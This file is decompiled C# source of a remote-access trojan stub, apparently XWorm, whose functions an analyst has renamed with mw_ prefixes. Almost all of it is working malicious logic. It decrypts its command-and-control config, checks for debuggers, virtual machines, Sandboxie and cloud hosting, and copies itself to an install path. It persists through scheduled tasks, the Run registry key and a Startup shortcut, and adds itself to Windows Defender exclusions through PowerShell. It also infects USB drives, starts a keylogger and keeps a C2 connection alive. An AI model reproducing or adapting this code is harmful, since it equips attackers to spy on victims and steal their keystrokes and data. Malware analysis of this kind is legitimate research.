using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

namespace Stub
{
	// Token: 0x02000008 RID: 8
	public class mw_Main
	{
		// Token: 0x06000026 RID: 38
		[STAThread]
		public static void mw_Main()
		{
			Thread.Sleep(checked(mw_config.mw_sleepTimeInSeconds * 1000));
			try
			{
				mw_config.mw_IPAddress = Conversions.ToString(mw_ConfigDecryptor.mw_decryptconfigValueFromAES(mw_config.mw_IPAddress));
				mw_config.mw_socketPort = Conversions.ToString(mw_ConfigDecryptor.mw_decryptconfigValueFromAES(mw_config.mw_socketPort));
				mw_config.mw_AESKey = Conversions.ToString(mw_ConfigDecryptor.mw_decryptconfigValueFromAES(mw_config.mw_AESKey));
				mw_config.mw_XwormTag = Conversions.ToString(mw_ConfigDecryptor.mw_decryptconfigValueFromAES(mw_config.mw_XwormTag));
				mw_config.mw_malwareName = Conversions.ToString(mw_ConfigDecryptor.mw_decryptconfigValueFromAES(mw_config.mw_malwareName));
				mw_config.mw_driveInfectionFilename = Conversions.ToString(mw_ConfigDecryptor.mw_decryptconfigValueFromAES(mw_config.mw_driveInfectionFilename));
				mw_config.mw_InstallPath = Environment.ExpandEnvironmentVariables(Conversions.ToString(mw_ConfigDecryptor.mw_decryptconfigValueFromAES(mw_config.mw_InstallPath)));
				mw_config.mw_localFilename = Conversions.ToString(mw_ConfigDecryptor.mw_decryptconfigValueFromAES(mw_config.mw_localFilename));
			}
			catch (Exception ex)
			{
				Environment.Exit(0);
			}
			if (!mw_Handler.mw_createNamedMutex())
			{
				Environment.Exit(0);
			}
			try
			{
				Stub.mw_Main.mw_isBeingDebugged();
			}
			catch (Exception ex2)
			{
			}
			Stub.mw_Main.mw_addMalwareToDefenderExclusionRules();
			string text = mw_config.mw_InstallPath + "\\" + mw_config.mw_localFilename;
			try
			{
				object fullName = new FileInfo(text).Directory.FullName;
				if (!Directory.Exists(Conversions.ToString(fullName)))
				{
					Directory.CreateDirectory(Conversions.ToString(fullName));
				}
				if (File.Exists(text))
				{
					FileInfo fileInfo = new FileInfo(text);
					fileInfo.Delete();
				}
				Thread.Sleep(1000);
				File.WriteAllBytes(text, File.ReadAllBytes(mw_Handler.mw_currentProcessFilename));
			}
			catch (Exception ex3)
			{
			}
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo("schtasks.exe");
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				if (Conversions.ToBoolean(mw_Utils.mw_checkIfCurrentUserIsAdmin()))
				{
					processStartInfo.Arguments = string.Concat(new string[]
					{
						"/create /f /RL HIGHEST /sc minute /mo 1 /tn \"",
						Path.GetFileNameWithoutExtension(mw_config.mw_localFilename),
						"\" /tr \"",
						text,
						"\""
					});
				}
				else
				{
					processStartInfo.Arguments = string.Concat(new string[]
					{
						"/create /f /sc minute /mo 1 /tn \"",
						Path.GetFileNameWithoutExtension(mw_config.mw_localFilename),
						"\" /tr \"",
						text,
						"\""
					});
				}
				Process process = Process.Start(processStartInfo);
				process.WaitForExit();
			}
			catch (Exception ex4)
			{
			}
			try
			{
				Template.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Path.GetFileNameWithoutExtension(mw_config.mw_localFilename), text);
			}
			catch (Exception ex5)
			{
			}
			try
			{
				string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Path.GetFileNameWithoutExtension(mw_config.mw_localFilename) + ".lnk";
				object instance = Interaction.CreateObject("WScript.Shell", "");
				Type type = null;
				string memberName = "CreateShortcut";
				object[] array = new object[]
				{
					text2
				};
				object[] arguments = array;
				string[] argumentNames = null;
				Type[] typeArguments = null;
				bool[] array2 = new bool[]
				{
					true
				};
				object obj = NewLateBinding.LateGet(instance, type, memberName, arguments, argumentNames, typeArguments, array2);
				if (array2[0])
				{
					text2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
				}
				object instance2 = obj;
				NewLateBinding.LateSetComplex(instance2, null, "TargetPath", new object[]
				{
					text
				}, null, null, false, true);
				NewLateBinding.LateSetComplex(instance2, null, "WorkingDirectory", new object[]
				{
					""
				}, null, null, false, true);
				NewLateBinding.LateCall(instance2, null, "Save", new object[0], null, null, null, true);
				mw_Handler.mw_filestream = new FileStream(text2, FileMode.Open);
			}
			catch (Exception ex6)
			{
			}
			mw_UsbAndDriveInfector.mw_startNewThread();
			mw_Handler.mw_preventSleep();
			new Thread(new ThreadStart(Stub.mw_Main.mw_startKeyLogger)).Start();
			if (Conversions.ToBoolean(mw_Utils.mw_checkIfCurrentUserIsAdmin()))
			{
				mw_ProcessKillPrevention.mw_makeProcessCritical();
			}
			Thread thread = new Thread(new ThreadStart(Stub.mw_Main.mw_trackIdleTime));
			Thread thread2 = new Thread(new ThreadStart(Stub.mw_Main.mw_keepAlive));
			thread.Start();
			thread2.Start();
			thread2.Join();
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00002ADC File Offset: 0x00000CDC
		public static void mw_addMalwareToDefenderExclusionRules()
		{
			if (Conversions.ToBoolean(mw_Utils.mw_checkIfCurrentUserIsAdmin()))
			{
				try
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = "powershell.exe";
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath '" + mw_Handler.mw_currentProcessFilename + "'";
					Process.Start(processStartInfo).WaitForExit();
					processStartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess '" + Process.GetCurrentProcess().MainModule.ModuleName + "'";
					Process.Start(processStartInfo).WaitForExit();
					processStartInfo.Arguments = string.Concat(new string[]
					{
						"-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath '",
						mw_config.mw_InstallPath,
						"\\",
						mw_config.mw_localFilename,
						"'"
					});
					Process.Start(processStartInfo).WaitForExit();
					processStartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess '" + Path.GetFileName(mw_config.mw_localFilename) + "'";
					Process.Start(processStartInfo).WaitForExit();
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00002109 File Offset: 0x00000309
		public static void mw_isBeingDebugged()
		{
			if (!Stub.mw_Main.mw_getOSInfo() && !Stub.mw_Main.mw_isRemoteDebuggerAttached())
			{
				if (!Stub.mw_Main.mw_isRunningInSandboxie())
				{
					if (!Stub.mw_Main.mw_OSContainsXP())
					{
						if (!Stub.mw_Main.mw_isMachineCloudHosted())
						{
							return;
						}
					}
				}
			}
			Environment.FailFast(null);
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00002BF4 File Offset: 0x00000DF4
		private static bool mw_isMachineCloudHosted()
		{
			try
			{
				string text = new WebClient().DownloadString("http://ip-api.com/line/?fields=hosting");
				return text.Contains("true");
			}
			catch (Exception ex)
			{
			}
			return false;
		}

		// Token: 0x0600002A RID: 42 RVA: 0x00002C44 File Offset: 0x00000E44
		private static bool mw_OSContainsXP()
		{
			try
			{
				if (new ComputerInfo().OSFullName.ToLower().Contains("xp"))
				{
					return true;
				}
			}
			catch (Exception ex)
			{
			}
			return false;
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00002C94 File Offset: 0x00000E94
		private static bool mw_getOSInfo()
		{
			try
			{
				using (object obj = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
				{
					using (object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, null, "Get", new object[0], null, null, null)))
					{
						try
						{
							foreach (object obj2 in ((IEnumerable)objectValue))
							{
								object objectValue2 = RuntimeHelpers.GetObjectValue(obj2);
								string text = NewLateBinding.LateIndexGet(objectValue2, new object[]
								{
									"Manufacturer"
								}, null).ToString().ToLower();
								if (Operators.CompareString(text, "microsoft corporation", false) != 0 || !NewLateBinding.LateIndexGet(objectValue2, new object[]
								{
									"Model"
								}, null).ToString().ToUpperInvariant().Contains("VIRTUAL"))
								{
									if (!text.Contains("vmware"))
									{
										if (Operators.CompareString(NewLateBinding.LateIndexGet(objectValue2, new object[]
										{
											"Model"
										}, null).ToString(), "VirtualBox", false) != 0)
										{
											continue;
										}
									}
								}
								return true;
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
			return false;
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00002E4C File Offset: 0x0000104C
		private static bool mw_isRemoteDebuggerAttached()
		{
			bool flag = false;
			bool result;
			try
			{
				Stub.mw_Main.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref flag);
				result = flag;
			}
			catch (Exception ex)
			{
				result = flag;
			}
			return result;
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00002E9C File Offset: 0x0000109C
		private static bool mw_isRunningInSandboxie()
		{
			bool result;
			try
			{
				if (Stub.mw_Main.GetModuleHandle("SbieDll.dll").ToInt32() != 0)
				{
					result = true;
				}
				else
				{
					result = false;
				}
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600002E RID: 46
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetModuleHandle([In] [Optional] string lpModuleName);

		// Token: 0x0600002F RID: 47
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		public static extern bool CheckRemoteDebuggerPresent([In] IntPtr hProcess, [In] [Out] ref bool pbDebuggerPresent);

		// Token: 0x06000030 RID: 48
		[CompilerGenerated]
		private static void mw_startKeyLogger()
		{
			mw_KeyLogger.mw_startKeyLogger();
		}

		// Token: 0x06000031 RID: 49
		[CompilerGenerated]
		[DebuggerStepThrough]
		private static void mw_trackIdleTime()
		{
			mw_Handler.mw_trackIdleTime();
		}

		// Token: 0x06000032 RID: 50
		[CompilerGenerated]
		private static void mw_keepAlive()
		{
			for (;;)
			{
				Thread.Sleep(new Random().Next(3000, 10000));
				if (!mw_Utils.mw_hasSocketAsyncCallSucceeded)
				{
					mw_Utils.mw_cleanup();
					mw_Utils.mw_testC2Connection();
				}
				mw_Utils.mw_manualResetEvent.WaitOne();
			}
		}
	}
}
